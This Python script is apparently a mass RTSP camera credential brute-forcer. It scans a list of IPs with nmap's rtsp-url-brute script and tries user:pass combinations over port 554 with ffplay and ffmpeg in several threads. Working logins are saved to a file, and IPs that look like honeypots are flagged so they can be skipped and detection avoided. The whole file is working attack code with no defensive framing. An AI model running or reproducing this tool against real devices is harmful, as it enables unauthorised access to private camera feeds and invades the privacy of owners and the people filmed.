import os
import subprocess
import threading
import queue
import time
import urllib.parse
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Constants
HONEYPOT_THRESHOLD = 3  # Number of successful logins to consider an IP a honeypot
HONEYPOT_FILE = "honeypots.txt"  # File to store honeypot IPs

def load_honeypots():
    """Load honeypot IPs from a file."""
    if not os.path.exists(HONEYPOT_FILE):
        return set()
    with open(HONEYPOT_FILE, "r") as f:
        return {line.strip() for line in f if line.strip()}

def save_honeypot(ip):
    """Save a honeypot IP to the file."""
    with open(HONEYPOT_FILE, "a") as f:
        f.write(f"{ip}\n")

def run_nmap(ip):
    """Runs Nmap with the rtsp-url-brute script on the given IP and saves the output."""
    output_file = f"{ip}.txt"
    cmd = ["nmap", "--script", "rtsp-url-brute", "-p", "554", ip]
    try:
        with open(output_file, "w") as f:
            subprocess.run(cmd, stdout=f, stderr=subprocess.DEVNULL, text=True, check=True)
        logging.info(f"Nmap scan completed for {ip}, results saved in {output_file}")
    except subprocess.CalledProcessError as e:
        logging.error(f"Nmap scan failed for {ip}: {e}")

def verify_success(ip, username, password):
    """Verifies a successful login using ffmpeg, with properly encoded credentials."""
    encoded_username = urllib.parse.quote(username, safe='')
    encoded_password = urllib.parse.quote(password, safe='')

    rtsp_url = f"rtsp://{encoded_username}:{encoded_password}@{ip}:554/"
    logging.info(f"Verifying credentials: {rtsp_url}")

    try:
        result = subprocess.run(
            ["ffmpeg", "-rtsp_transport", "tcp", "-i", rtsp_url, "-t", "5", "-f", "null", "-"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=5
        )

        if any(err in result.stderr for err in ["Unauthorized", "Invalid data found", "Connection refused", "400 Bad Request"]):
            logging.warning(f"False positive: {rtsp_url} (Verification failed)")
            return False

        logging.info(f"CONFIRMED SUCCESS: {rtsp_url}")
        with open("valid_credentials.txt", "a") as f:
            f.write(f"{ip} {username}:{password}\n")
        return True
    except subprocess.TimeoutExpired:
        logging.warning(f"Verification timeout: {rtsp_url}")
    except Exception as e:
        logging.error(f"Error during verification: {e}")

    return False

def attempt_login(ip, username, password):
    """Attempts RTSP login and verifies success, properly encoding special characters."""
    encoded_username = urllib.parse.quote(username, safe='')
    encoded_password = urllib.parse.quote(password, safe='')

    rtsp_url = f"rtsp://{encoded_username}:{encoded_password}@{ip}:554/"
    logging.info(f"Trying {rtsp_url}")

    try:
        result = subprocess.run(
            ["ffplay", "-rtsp_transport", "tcp", "-i", rtsp_url, "-t", "7"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=5
        )

        if any(err in result.stderr for err in ["401 Unauthorized", "Invalid data found", "Connection refused", "400 Bad Request"]):
            logging.warning(f"Failed: {rtsp_url} (Invalid credentials)")
        else:
            logging.info(f"Possible success: {rtsp_url}")
            return verify_success(ip, username, password)

    except subprocess.TimeoutExpired:
        logging.warning(f"Failed: {rtsp_url} (Timeout)")
    except Exception as e:
        logging.error(f"Error during login attempt: {e}")

    return False

def brute_force_worker(ip, creds_queue, success_list):
    """Worker function to process the credential queue."""
    while not creds_queue.empty():
        username, password = creds_queue.get()
        if attempt_login(ip, username, password):
            success_list.append((ip, username, password))  # Store success credentials
        creds_queue.task_done()

def brute_force_rtsp(ip, creds):
    """Attempts RTSP brute-force login using multiple threads for a given IP."""
    creds_queue = queue.Queue()
    success_list = []  # List to store successful logins

    # Populate the queue with all username-password combinations
    for cred in creds:
        username, password = cred.split(":", 1)
        creds_queue.put((username, password))

    # Launch threads
    threads = []
    num_threads = min(5, len(creds))  # Limit concurrent login attempts
    for _ in range(num_threads):
        thread = threading.Thread(target=brute_force_worker, args=(ip, creds_queue, success_list))
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    creds_queue.join()
    for thread in threads:
        thread.join()

    return success_list  # Return all successful credentials for this IP

def worker(ip, creds, success_results, honeypots):
    """Worker function to process an IP."""
    if ip in honeypots:
        logging.info(f"Skipping honeypot IP: {ip}")
        return

    run_nmap(ip)
    success_creds = brute_force_rtsp(ip, creds)
    success_results[ip] = success_creds

    # Check for honeypot
    if len(success_creds) >= HONEYPOT_THRESHOLD:
        logging.warning(f"Potential honeypot detected: {ip} (multiple successful logins)")
        save_honeypot(ip)
        honeypots.add(ip)

def main(ip_list_file, creds_file):
    if not os.path.exists(ip_list_file):
        logging.error(f"IP list file {ip_list_file} not found!")
        return
    if not os.path.exists(creds_file):
        logging.error(f"Credentials file {creds_file} not found!")
        return

    with open(ip_list_file, "r") as f:
        ips = [line.strip() for line in f if line.strip()]
    with open(creds_file, "r") as f:
        creds = [line.strip() for line in f if ":" in line]

    success_results = {}
    honeypots = load_honeypots()

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(worker, ip, creds, success_results, honeypots): ip for ip in ips}
        for future in as_completed(futures):
            ip = futures[future]
            try:
                future.result()
            except Exception as e:
                logging.error(f"Error processing IP {ip}: {e}")

    # Save all successfully cracked credentials
    with open("valid_credentials.txt", "a") as f:
        for ip, success_creds in success_results.items():
            for username, password in success_creds:
                f.write(f"{ip} {username}:{password}\n")

if __name__ == "__main__":
    ip_list = "ips.txt"  # List of IPs, one per line
    creds_list = "creds.txt"  # List of credentials in user:pass format
    main(ip_list, creds_list)
